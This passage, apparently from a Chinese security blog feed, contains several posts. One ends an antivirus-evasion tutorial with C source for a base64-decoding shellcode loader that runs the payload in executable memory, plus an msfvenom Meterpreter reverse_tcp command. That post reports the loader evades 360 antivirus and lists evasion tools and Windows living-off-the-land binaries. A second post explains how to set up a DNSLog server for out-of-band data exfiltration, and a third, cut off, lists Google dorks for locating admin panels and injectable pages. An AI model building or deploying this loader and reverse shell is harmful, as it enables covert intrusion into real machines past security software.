class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;/&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解码时使用</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> base64_suffix_map[<span class="number">256</span>] = &#123;</span><br><span class="line">    <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">253</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">255</span>, <span class="number">253</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">253</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,  <span class="number">62</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,  <span class="number">63</span>,</span><br><span class="line">    <span class="number">52</span>,  <span class="number">53</span>,  <span class="number">54</span>,  <span class="number">55</span>,  <span class="number">56</span>,  <span class="number">57</span>,  <span class="number">58</span>,  <span class="number">59</span>,  <span class="number">60</span>,  <span class="number">61</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">255</span>, <span class="number">254</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">2</span>,   <span class="number">3</span>,   <span class="number">4</span>,   <span class="number">5</span>,   <span class="number">6</span>,</span><br><span class="line">    <span class="number">7</span>,   <span class="number">8</span>,   <span class="number">9</span>,  <span class="number">10</span>,  <span class="number">11</span>,  <span class="number">12</span>,  <span class="number">13</span>,  <span class="number">14</span>,  <span class="number">15</span>,  <span class="number">16</span>,  <span class="number">17</span>,  <span class="number">18</span>,</span><br><span class="line">    <span class="number">19</span>,  <span class="number">20</span>,  <span class="number">21</span>,  <span class="number">22</span>,  <span class="number">23</span>,  <span class="number">24</span>,  <span class="number">25</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">255</span>,  <span class="number">26</span>,  <span class="number">27</span>,  <span class="number">28</span>,  <span class="number">29</span>,  <span class="number">30</span>,  <span class="number">31</span>,  <span class="number">32</span>,  <span class="number">33</span>,  <span class="number">34</span>,  <span class="number">35</span>,  <span class="number">36</span>,</span><br><span class="line">    <span class="number">37</span>,  <span class="number">38</span>,  <span class="number">39</span>,  <span class="number">40</span>,  <span class="number">41</span>,  <span class="number">42</span>,  <span class="number">43</span>,  <span class="number">44</span>,  <span class="number">45</span>,  <span class="number">46</span>,  <span class="number">47</span>,  <span class="number">48</span>,</span><br><span class="line">    <span class="number">49</span>,  <span class="number">50</span>,  <span class="number">51</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> <span class="title function_">cmove_bits</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> src, <span class="type">unsigned</span> lnum, <span class="type">unsigned</span> rnum)</span> &#123;</span><br><span class="line">    src &lt;&lt;= lnum; <span class="comment">// src = src &lt;&lt; lnum;</span></span><br><span class="line">    src &gt;&gt;= rnum; <span class="comment">// src = src &gt;&gt; rnum;</span></span><br><span class="line">    <span class="keyword">return</span> src;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">base64_encode</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *indata, <span class="type">int</span> inlen, <span class="type">char</span> *outdata, <span class="type">int</span> *outlen)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ret = <span class="number">0</span>; <span class="comment">// return value</span></span><br><span class="line">    <span class="keyword">if</span> (indata == <span class="literal">NULL</span> || inlen == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ret = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> in_len = <span class="number">0</span>; <span class="comment">// 源字符串长度, 如果in_len不是3的倍数, 那么需要补成3的倍数</span></span><br><span class="line">    <span class="type">int</span> pad_num = <span class="number">0</span>; <span class="comment">// 需要补齐的字符个数, 这样只有2, 1, 0(0的话不需要拼接, )</span></span><br><span class="line">    <span class="keyword">if</span> (inlen % <span class="number">3</span> != <span class="number">0</span>) &#123;</span><br><span class="line">        pad_num = <span class="number">3</span> - inlen % <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    in_len = inlen + pad_num; <span class="comment">// 拼接后的长度, 实际编码需要的长度(3的倍数)</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> out_len = in_len * <span class="number">8</span> / <span class="number">6</span>; <span class="comment">// 编码后的长度</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *p = outdata; <span class="comment">// 定义指针指向传出data的首地址</span></span><br><span class="line"></span><br><span class="line">                       <span class="comment">//编码, 长度为调整后的长度, 3字节一组</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; in_len; i += <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="type">int</span> value = *indata &gt;&gt; <span class="number">2</span>; <span class="comment">// 将indata第一个字符向右移动2bit(丢弃2bit)</span></span><br><span class="line">        <span class="type">char</span> c = base64_alphabet[value]; <span class="comment">// 对应base64转换表的字符</span></span><br><span class="line">        *p = c; <span class="comment">// 将对应字符(编码后字符)赋值给outdata第一字节</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">//处理最后一组(最后3字节)的数据</span></span><br><span class="line">        <span class="keyword">if</span> (i == inlen + pad_num - <span class="number">3</span> &amp;&amp; pad_num != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pad_num == <span class="number">1</span>) &#123;</span><br><span class="line">                *(p + <span class="number">1</span>) = base64_alphabet[(<span class="type">int</span>)(cmove_bits(*indata, <span class="number">6</span>, <span class="number">2</span>) + cmove_bits(*(indata + <span class="number">1</span>), <span class="number">0</span>, <span class="number">4</span>))];</span><br><span class="line">                *(p + <span class="number">2</span>) = base64_alphabet[(<span class="type">int</span>)cmove_bits(*(indata + <span class="number">1</span>), <span class="number">4</span>, <span class="number">2</span>)];</span><br><span class="line">                *(p + <span class="number">3</span>) = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (pad_num == <span class="number">2</span>) &#123; <span class="comment">// 编码后的数据要补两个 &#x27;=&#x27;</span></span><br><span class="line">                *(p + <span class="number">1</span>) = base64_alphabet[(<span class="type">int</span>)cmove_bits(*indata, <span class="number">6</span>, <span class="number">2</span>)];</span><br><span class="line">                *(p + <span class="number">2</span>) = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">                *(p + <span class="number">3</span>) = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="comment">// 处理正常的3字节的数据</span></span><br><span class="line">            *(p + <span class="number">1</span>) = base64_alphabet[cmove_bits(*indata, <span class="number">6</span>, <span class="number">2</span>) + cmove_bits(*(indata + <span class="number">1</span>), <span class="number">0</span>, <span class="number">4</span>)];</span><br><span class="line">            *(p + <span class="number">2</span>) = base64_alphabet[cmove_bits(*(indata + <span class="number">1</span>), <span class="number">4</span>, <span class="number">2</span>) + cmove_bits(*(indata + <span class="number">2</span>), <span class="number">0</span>, <span class="number">6</span>)];</span><br><span class="line">            *(p + <span class="number">3</span>) = base64_alphabet[*(indata + <span class="number">2</span>) &amp; <span class="number">0x3f</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p += <span class="number">4</span>;</span><br><span class="line">        indata += <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (outlen != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        *outlen = out_len;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">base64_decode</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *indata, <span class="type">int</span> inlen, <span class="type">char</span> *outdata)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (indata == <span class="literal">NULL</span> || inlen &lt;= <span class="number">0</span> || outdata == <span class="literal">NULL</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> ret = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (inlen % <span class="number">4</span> != <span class="number">0</span>) &#123; <span class="comment">// 需要解码的数据不是4字节倍数</span></span><br><span class="line">        <span class="keyword">return</span> ret = <span class="number">-2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> t = <span class="number">0</span>, x = <span class="number">0</span>, y = <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> c = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> g = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (indata[x] != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 需要解码的数据对应的ASCII值对应base64_suffix_map的值</span></span><br><span class="line">        c = base64_suffix_map[indata[x++]];</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="number">255</span>) <span class="keyword">return</span> <span class="number">-1</span>;<span class="comment">// 对应的值不在转码表中</span></span><br><span class="line">        <span class="keyword">if</span> (c == <span class="number">253</span>) <span class="keyword">continue</span>;<span class="comment">// 对应的值是换行或者回车</span></span><br><span class="line">        <span class="keyword">if</span> (c == <span class="number">254</span>) &#123; c = <span class="number">0</span>; g--; &#125;<span class="comment">// 对应的值是&#x27;=&#x27;</span></span><br><span class="line">        t = (t &lt;&lt; <span class="number">6</span>) | c; <span class="comment">// 将其依次放入一个int型中占3字节</span></span><br><span class="line">        <span class="keyword">if</span> (++y == <span class="number">4</span>) &#123;</span><br><span class="line">            outdata[i++] = (<span class="type">unsigned</span> <span class="type">char</span>)((t &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="keyword">if</span> (g &gt; <span class="number">1</span>) outdata[i++] = (<span class="type">unsigned</span> <span class="type">char</span>)((t &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="keyword">if</span> (g &gt; <span class="number">2</span>) outdata[i++] = (<span class="type">unsigned</span> <span class="type">char</span>)(t &amp; <span class="number">0xff</span>);</span><br><span class="line">            y = t = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>base64.h</code>文件内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> base64_h</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> base64_h</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">base64_encode</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *indata, <span class="type">int</span> inlen, <span class="type">char</span> *outdata, <span class="type">int</span> *outlen)</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">base64_decode</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *indata, <span class="type">int</span> inlen, <span class="type">char</span> *outdata)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* base64_h */</span></span></span><br></pre></td></tr></table></figure><p><code>shellcode.c</code>文件内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;base64.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="string">&quot;msf base64 code&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> str3[<span class="number">1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 原po代码报错，这里做了一些强制转换和类型修正</span></span><br><span class="line">    base64_decode(buf, (<span class="type">int</span>)<span class="built_in">strlen</span>(buf), str3);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *Memory;</span><br><span class="line"></span><br><span class="line">    Memory = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(str3), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(Memory, str3, <span class="keyword">sizeof</span>(str3));</span><br><span class="line"></span><br><span class="line">    ((<span class="type">void</span>(*)())Memory)();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用msf生成base64编码的shellcode：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp --encrypt base64  lhost=192.168.174.128 lport=6666  -f c &gt; shell.c</span><br></pre></td></tr></table></figure><p>把<code>shell.c</code>的内容复制到上面<code>shellcode.c</code>文件中。vs2019编译，关闭杀软，msf可成功上线。</p><p>打开杀软，火绒可以查杀，<strong>360不能查杀</strong>。</p><p>virustotal.com上查杀率为17&#x2F;67（原po为28&#x2F;69）。</p><p><img src="/./images/202205301558330.png" alt="image-20220530155809229"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>与2020年相比，2022年卷了很多。纵览360和火绒就能直观感受到，确实杀软能力越来越强了。2020年可以Bypass卡巴斯基、McAfee、Symantec等杀软的方法，2022年均失效。</p><p>免杀操作层出不穷，特别是近两年也有很多新的优秀项目。本文仅为最基本的免杀方式，前路漫漫，还有很多要学习的，共勉。</p><p>一些知识点：</p><ul><li>常见免杀工具（21种）：msf自免杀、Veil、Venom、Shellter、BackDoor-Factory、Avet、TheFatRat、Avoidz、Green-Hat-Suite、zirikatu、AVIator、DKMC、Unicorn、Python-Rootkit、DKMC、Unicorn、Python-Rootkit、ASWCrypter、nps_payload、GreatSCT、HERCULES、SpookFlare、SharpShooter、CACTUSTORCH、Winpayload等。</li><li>常见免杀编程语言：C&#x2F;C++、C#、python、powershell、ruby、go等。</li><li>常见免杀白名单程序（113个）：Rundll32.exe、Msiexec.exe、MSBuild.exe、InstallUtil.exe、Mshta.exe、Regsvr32.exe、Cmstp.exe、CScript.exe、WScript.exe、Forfiles.exe、te.exe、Odbcconf.exe、InfDefaultInstall.exe、Diskshadow.exe、PsExec.exe、Msdeploy.exe、Winword.exe、Regasm.exe、Regsvcs.exe、Ftp.exe、pubprn.vbs、winrm.vbs、slmgr.vbs、Xwizard.exe、Compiler.exe、IEExec.exe、MavInject32、Presentationhost.exe、Wmic.exe、Pcalua.exe、Url.dll、zipfldr.dll、Syncappvpublishingserver.vbs等。</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li>BypassAntiVirus：远控免杀系列文章 <a href="https://github.com/TideSec/BypassAntiVirus">https://github.com/TideSec/BypassAntiVirus</a></li><li>AntivirusScanner：杀软进程检测脚本 <a href="https://github.com/Threekiii/Awesome-Redteam/tree/master/scripts/AntivirusScanner">https://github.com/Threekiii/Awesome-Redteam/tree/master/scripts/AntivirusScanner</a><br></style></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 攻防知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>平台搭建-DNSLog</title>
      <link href="/smallhao/%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA-DNSLog/"/>
      <url>/smallhao/%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA-DNSLog/</url>
      
        <content type="html"><![CDATA[<h1 id="DNS-Log平台搭建"><a href="#DNS-Log平台搭建" class="headerlink" title="DNS Log平台搭建"></a>DNS Log平台搭建</h1><h2 id="DNS-Log简介"><a href="#DNS-Log简介" class="headerlink" title="DNS Log简介"></a>DNS Log简介</h2><p>在某些情况下，无法利用漏洞获得回显。但是，如果目标可以发送DNS请求，则可以通过DNS Log方式将想获得的数据外带出来（oob）。</p><p>DNS log常用于以下情况：</p><ul><li>SQL盲注</li><li>无回显的命令执行</li><li>无回显的SSRF</li></ul><h2 id="搭建DNS-Log平台"><a href="#搭建DNS-Log平台" class="headerlink" title="搭建DNS Log平台"></a>搭建DNS Log平台</h2><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><p>一台VPS：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.1.1.1</span><br></pre></td></tr></table></figure><p>两个域名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.com</span><br><span class="line">b.com</span><br></pre></td></tr></table></figure><p>在<code>b.com</code>中添加两个A记录：</p><p><img src="/./images/202205091508042.png" alt="image-20220509150850946"></p><p>修改<code>a.com</code>的NS记录为：</p><p><img src="/./images/202205091513716.png" alt="image-20220509151352683"></p><h3 id="项目部署"><a href="#项目部署" class="headerlink" title="项目部署"></a>项目部署</h3><p>参考开源项目DNSlog-GO：</p><ul><li><a href="https://github.com/lanyi1998/DNSlog-GO">https://github.com/lanyi1998/DNSlog-GO</a></li></ul><p>VPS防火墙放行53端口、80端口，修改配置文件<code>config.ini</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[HTTP]</span><br><span class="line">Port = 80</span><br><span class="line">Token = &lt;API TOKEN 1 HERE&gt;,&lt;API TOKEN 2 HERE&gt;</span><br><span class="line">ConsoleDisable = false</span><br><span class="line"></span><br><span class="line">[DNS]</span><br><span class="line">Domain = a.com</span><br></pre></td></tr></table></figure><p>运行<code>main</code>文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./main</span><br></pre></td></tr></table></figure><h3 id="使用测试"><a href="#使用测试" class="headerlink" title="使用测试"></a>使用测试</h3><p><img src="/./images/202205091525438.png" alt="image-20220509152556402"><br></style></p>]]></content>
      
      
      
        <tags>
            
            <tag> 攻防知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集-敏感信息收集</title>
      <link href="/smallhao/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/smallhao/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="信息收集-敏感信息收集"><a href="#信息收集-敏感信息收集" class="headerlink" title="信息收集-敏感信息收集"></a>信息收集-敏感信息收集</h1><h2 id="Google"><a href="#Google" class="headerlink" title="Google"></a>Google</h2><ul><li>Google Hacking Database：<a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></li><li>Google Hacking：<a href="https://pentest-tools.com/information-gathering/google-hacking">https://pentest-tools.com/information-gathering/google-hacking</a></li><li>Google Dork：<a href="https://cxsecurity.com/dorks/">https://cxsecurity.com/dorks/</a></li></ul><h3 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h3><h4 id="管理后台地址"><a href="#管理后台地址" class="headerlink" title="管理后台地址"></a>管理后台地址</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">site:target.com intext:管理 | 后台 | 后台管理 | 登陆 | 登录 | 用户名 | 密码 | 系统 | 账号 | login | system</span><br><span class="line">site:target.com inurl:login | inurl:admin | inurl:manage | inurl:manager | inurl:admin_login | inurl:system | inurl:backend</span><br><span class="line">site:target.com intitle:管理 | 后台 | 后台管理 | 登陆 | 登录</span><br></pre></td></tr></table></figure><h4 id="上传类漏洞地址"><a href="#上传类漏洞地址" class="headerlink" title="上传类漏洞地址"></a>上传类漏洞地址</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:target.com inurl:file</span><br><span class="line">site:target.com inurl:upload</span><br></pre></td></tr></table></figure><h4 id="注入页面"><a href="#注入页面" class="headerlink" title="注入页面"></a>注入页面</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:target.com inurl:?id=</span><br><span class="line">site:target.com inurl:php?id=</span><br></pre></td></tr></table></figure><h4 id="编辑器页面"><a href="#编辑器页面" class="headerlink" title="编辑器页面"></a>编辑器页面</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:target.com inurl:ewebeditor</span><br></pre></td></tr></table></figure><h4 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:target.com intitle: &quot;index of&quot;</span><br></pre></td></tr></table></figure><h4 id="URL-跳转"><a href="#URL-跳转" class="headerlink" title="URL 跳转"></a>URL 跳转</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:target.com 